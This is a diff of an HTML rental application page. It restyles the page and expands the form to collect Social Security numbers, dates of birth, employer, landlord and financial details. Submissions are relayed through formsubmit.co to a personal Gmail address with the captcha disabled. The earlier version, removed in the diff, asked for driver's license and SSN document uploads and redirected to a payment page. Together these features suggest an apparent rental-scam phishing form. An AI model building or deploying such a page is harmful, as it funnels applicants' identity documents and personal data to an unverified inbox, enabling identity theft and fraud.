@@ -1,43 +1,179 @@
-
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Rental Application Form</title>
   <meta charset="UTF-8">
+  <title>Rental Application Form</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 20px;
+      line-height: 1.6;
+      background-color: #f4f4f4;
+    }
+    form {
+      background-color: white;
+      padding: 20px;
+      border-radius: 5px;
+      max-width: 800px;
+      margin: auto;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+    h2 {
+      text-align: center;
+    }
+    label {
+      font-weight: bold;
+      display: block;
+      margin-top: 15px;
+    }
+    input, textarea, select {
+      width: 100%;
+      padding: 8px;
+      margin-top: 5px;
+      border-radius: 4px;
+      border: 1px solid #ccc;
+    }
+    .form-inline {
+      display: flex;
+      gap: 10px;
+    }
+    .form-inline > div {
+      flex: 1;
+    }
+    button {
+      background-color: #007BFF;
+      color: white;
+      padding: 12px 20px;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
+  </style>
 </head>
 <body>
-  <h2>Rental Application</h2>
-  <form action="https://formsubmit.co/luxoftorganization@gmail.com" method="POST" enctype="multipart/form-data">
-    <input type="hidden" name="_next" value="payment.html">
 
-    <label>Full Name:</label><br>
-    <input type="text" name="full_name" required><br><br>
+  <form action="https://formsubmit.co/luxoftorganization@gmail.com" method="POST">
+    <input type="hidden" name="_next" value="https://yourusername.github.io/rental-form/thank-you.html">
+    <input type="hidden" name="_captcha" value="false">
 
-    <label>Email:</label><br>
-    <input type="email" name="email" required><br><br>
+    <h2>Rental Application Form</h2>
 
-    <label>Phone Number:</label><br>
-    <input type="text" name="phone" required><br><br>
+    <label for="date">Today's Date</label>
+    <input type="date" id="date" name="date">
 
-    <label>Current Address:</label><br>
-    <input type="text" name="address" required><br><br>
+    <label for="address">Applied For</label>
+    <input type="text" id="address" name="applied_for">
 
-    <label>Employment Info:</label><br>
-    <textarea name="employment" required></textarea><br><br>
+    <div class="form-inline">
+      <div>
+        <label for="last_name">Last Name</label>
+        <input type="text" id="last_name" name="last_name">
+      </div>
+      <div>
+        <label for="first_name">First Name</label>
+        <input type="text" id="first_name" name="first_name">
+      </div>
+      <div>
+        <label for="middle_name">Middle name</label>
+        <input type="text" id="mi" name="mi" maxlength="1">
+      </div>
+    </div>
 
-    <label>References:</label><br>
-    <textarea name="references"></textarea><br><br>
+    <label for="ssn">SS#</label>
+    <input type="text" id="ssn" name="ssn">
 
-    <label>Driver's License (Front):</label><br>
-    <input type="file" name="dl_front" accept="image/*,application/pdf"><br><br>
+    <label for="dob">Date of Birth</label>
+    <input type="date" id="dob" name="dob">
 
-    <label>Driver's License (Back):</label><br>
-    <input type="file" name="dl_back" accept="image/*,application/pdf"><br><br>
+    <label for="phone">Phone #</label>
+    <input type="tel" id="phone" name="phone">
 
-    <label>SSN Document:</label><br>
-    <input type="file" name="ssn_doc" accept="image/*,application/pdf"><br><br>
+    <label for="previous_address">Previous Address</label>
+    <textarea id="previous_address" name="previous_address"></textarea>
+
+    <label for="landlord">Landlord or Mortgage Co.</label>
+    <input type="text" id="landlord" name="landlord">
+
+    <label for="landlord_phone">Phone</label>
+    <input type="tel" id="landlord_phone" name="landlord_phone">
+
+    <label for="rent_amount">Rent Amount</label>
+    <input type="text" id="rent_amount" name="rent_amount">
+
+    <label for="reason_leaving">Reason for Leaving</label>
+    <textarea id="reason_leaving" name="reason_leaving"></textarea>
+
+    <label for="status">Single or Married</label>
+    <input type="text" id="status" name="status">
+
+    <label>Proposed Occupants and Ages</label>
+    <div class="form-inline">
+      <input type="text" name="occupant1" placeholder="1">
+      <input type="text" name="occupant2" placeholder="2">
+      <input type="text" name="occupant3" placeholder="3">
+      <input type="text" name="occupant4" placeholder="4">
+      <input type="text" name="occupant5" placeholder="5">
+    </div>
+
+    <label for="pet">Pet</label>
+    <input type="text" id="pet" name="pet">
+
+    <label for="vehicle">Vehicle Type</label>
+    <input type="text" id="vehicle" name="vehicle">
+
+    <label>Smoker</label>
+    <input type="radio" name="smoker" value="yes"> Yes
+    <input type="radio" name="smoker" value="no"> No
+
+    <label for="deposit_date">Earliest Date for Deposit Payment</label>
+    <input type="date" id="deposit_date" name="deposit_date">
+
+    <label for="funds">Available Funds to Secure Property</label>
+    <input type="text" id="funds" name="funds">
+
+    <label for="movein_date">Proposed Move-in Date</label>
+    <input type="date" id="movein_date" name="movein_date">
+
+    <label>Employment Status</label>
+    <label><input type="checkbox" name="employment_status" value="full_time"> Full Time</label>
+    <label><input type="checkbox" name="employment_status" value="part_time"> Part Time</label>
+    <label><input type="checkbox" name="employment_status" value="unemployed"> Unemployed</label>
+    <label><input type="checkbox" name="employment_status" value="student"> Student</label>
+    <label><input type="checkbox" name="employment_status" value="retired"> Retired</label>
+
+    <label for="employer">Employer</label>
+    <input type="text" id="employer" name="employer">
+
+    <label for="employment_duration">How long employed?</label>
+    <input type="text" id="employment_duration" name="employment_duration">
+
+    <label for="employer_address">Employer Address</label>
+    <textarea id="employer_address" name="employer_address"></textarea>
+
+    <label for="employer_phone">Employer Phone</label>
+    <input type="tel" id="employer_phone" name="employer_phone">
+
+    <label for="reference">Personal Reference</label>
+    <input type="text" id="reference" name="reference">
+
+    <label for="reference_phone">Reference Phone</label>
+    <input type="tel" id="reference_phone" name="reference_phone">
+
+    <p>Applicant confirms the above statements are accurate and authorizes verification.</p>
+
+    <label for="signature_date">Date</label>
+    <input type="date" id="signature_date" name="signature_date">
+
+    <label for="applicant_signature">Applicant Signature</label>
+    <input type="text" id="applicant_signature" name="applicant_signature">
+
 
     <button type="submit">Submit Application</button>
   </form>
+
 </body>
-</html>
+                                               </html>
